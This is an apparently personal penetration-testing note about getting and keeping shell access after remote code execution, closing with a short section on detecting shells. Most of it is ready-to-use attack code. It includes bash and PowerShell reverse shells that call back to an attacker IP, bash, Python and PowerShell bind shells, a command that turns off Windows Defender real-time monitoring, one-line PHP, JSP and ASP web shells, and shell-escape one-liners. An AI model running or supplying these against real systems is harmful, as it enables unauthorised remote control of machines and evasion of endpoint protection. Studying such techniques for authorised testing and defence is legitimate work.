```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

Once a host has been compromised and we have RCE, setting up some form of persistent communication is a key part of [[5 - Post-Exploitation]].

**Linux:**
Some useful considerations before establishing a shell session:
- What distribution is on the system?
- What shell & programming languages are on the system?
- What is the purpose and function of the system in its network environment?
- What applications is the system hosting?
- Are there any known vulnerabilities?

## Types of Shells
### Reverse Shell
Connects back to our system and gives us control through a reverse connection. We setup a listener on our machine and then connect back to it from the target.
![[Netcat (nc)#Create a listener]]

Connecting back to our system with a shell is slightly more complex as it depends what we have available. The [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) page has a comprehensive list of reverse shells.

**Bash**
```bash
bash -c 'bash -i >& /dev/tcp/[IP]/[Port] 0>&1'
```

**Netcat**
![[Netcat (nc)#Create a simple reverse shell]]

**Powershell via CMD**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
> Sometimes we might be able to disable Windows defender Virus & Threat protection, allowing us to run the above:
> `Set-MpPreference -DisableRealtimeMonitoring $true`
> A script version of a similar process is available [here](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

> 1. `powershell -nop -c` creates a no profile (`nop`) and executes the following code (`-c`)
> 2. `$client = New-Object System.Net.Sockets.TCPClient('<ip>', <port>);` First we connect to a TCP socket and set it as the client
> 3. `$client.GetStream();` Now open the stream with `GetStream`
> 4. `[byte[]]$bytes = 0..65535|%{0};` Create an empty byte stream to send to our TCP listener
> 5. `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)` starts a loop to read through the bytes buffer
> 6. `{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);` This encodes the bytes buffer into ASCII characters
> 7. `$sendback = (iex $data 2>&1 | Out-String );` invokes the data and redirects its output to be turned from an object to a string
> 8. `$sb2 = $sb + 'PS ' + (pwd).Path + '> ';` this creates the prompt on the end of the data
> 9. `$sendbyte ...;$s.Write(...);$s.Flush(...)};` creates the final encoded byte stream that we will send via the TCP socket
> 10. `$client.Close()"` will close the connection at the end when its terminated

## Bind Shells
Unlike a reverse shell, a Bind shell connects us to the *targets'* listening port. This means we are connecting to the target rather than them connecting to us (the opposite direction to a RS).

To create a bind shell, we need to listen on a port on the target and bind a shell to that port. Then on the tester machine we can us [[Netcat (nc)]] to connect to it.

Some challenges with bind shells however:
- We need an already active listener or be able to create one ourselves.
- It is typical for strict incoming firewall rules and NAT on the edge of the network (public-facing), so we would need to be on the internal network already.
- OS firewalls often block incoming connections that aren't associated with trusted network-based applications.

To setup a bind shell on the server, we need to define:
- the directory
- the shell
- the listener
- a pipeline (eg. a named pipe) : *a file that can be written and read by multiple processes*
- input & output redirection

**Bash**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lv 1234 >/tmp/f
```
> 1. Remove any existing `/tmp/f`
> 2. Create a named pipe at `/tmp/f` with `mkfifo`
> 3. Read input from `/tmp/f` with `cat`
> 4. Spawn an interactive bash shell with errors being redirected to stdout
> 5. Start a `nc` listener that writes to `/tmp/f`
> With this, any commands sent via the nc connection are written and then read from `/tmp/f`, executed and output is returned back down the connection.

**Python**
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

**Powershell**
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

## Upgrading TTY
To give us more terminal features (eg. a prompt, mouse, history, etc) we need to upgrade the TTY. Often when creating a shell via an application user eg. `apache`, no shell interpreter language has been defined in the environment variables for that user. This means that we need to spawn our own TTY to gain these functionalities.
### Python
```shell
python -c 'import pty; pty.spawn("/bin/sh")'
```
```shell
python3 -c 'import pty; pty.spawn("/bin/sh")'
```
### Interactive
```shell
/bin/sh -i
/bin/bash -i
```
### Perl
```shell
perl -e 'exec "/bin/sh";'
```
```perl
# Run inside a ruby script
exec "/bin/sh";
```
### Ruby
```shell
ruby -e 'exec "/bin/sh"'
```
```ruby
# Run inside a ruby script
exec "/bin/sh"
```
### Lua
```lua
os.execute('/bin/sh')
```
### AWK
```shell
awk 'BEGIN {system("/bin/sh")}'
```
### Find
```shell
# If it finds the file, then it will execute a shell
find / -name [file_name] -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit
```
### VIM
```shell
vim -c ':!/bin/sh'
```
```shell
# VIM escape
vim
:set shell=/bin/sh
:shell
```

## Web Shells
This is a web script that accepts commands through HTTP params, executes the command and returns the output. There are two components to using these: Uploading the web shell and executing the shell.

A great benefit of these kind of shells is that they utilise the existing connection that would be allowed through a firewall.

A really useful project for webshells is [Laudanum Webshells](https://github.com/jbarcia/Web-Shells/tree/master/laudanum). This contains a variety of webshells that can be injected through various means.
Additionally to this, the `Antak` webshell in the [Nishang project](https://github.com/samratashok/nishang) is a very powerful *PowerShell* webshell, it has a variety of features such as running scripts from memory and encoding commands.
### Writing a web shell
Web shells tend to be simple one line commands that take a command and execute them on the system. The following examples are all *GET* requests:

**PHP**
```
<?php system($_REQUEST["cmd"]); ?>
```

**JSP**
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**ASP**
```
<% eval request("cmd") %>
```

### Uploading the web shell
We need to get our web shell script into the web root to be able to execute it. This can either be through a file upload vulnerability, or even an RCE could let us write the file on the target system ourself.

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| Apache     | /var/www/html/         |
| Nginx      | /usr/local/nginx/html/ |
| IIS        | c:\inetpub\wwwroot\    |
| XAMPP      | C:\xampp\htdocs\       |
## Detecting & Preventing Shells
### Monitoring
- *File Uploads* : A very common way to gain a shell, often used with web applications. Monitor application logs for file uploads that seem malicious (eg. wrong file extension, suspicious metadata, mismatched headers). Firewalls and anti-virus can add more layers here, any external-facing host should be sufficiently hardened and monitored.
- *Suspicious non-admin user actions* : This is non-administrator users performing actions that you wouldn't expect from a normal user:
	- Issuing bash or cmd commands could be an indicator eg. `whoami` is not common for a normal user
	- Making connections to non-standard resources eg. connecting to another host via an SMB share that isn't part of the normal infrastructure (these are usually client connecting to an infrastructure server, not a client to another client)
	- Utilise logging to monitor all interactions a user has with a shell interface as well as any other interactions they have with the system (syslogs)
- *Anomalous network sessions* : Users tend to have patterns and routines (eg. use the same apps, websites, interactions at regular times). Watch for:
	- Anomalous network traffic (first visits, unique activities, unusual traffic)
	- Heartbeats on non-standard ports (eg. 4444 is often used by meterpreter)
	- Looking for remote login attempts
	- Bulk GET / POST requests in short amounts of time

### Network Visibility
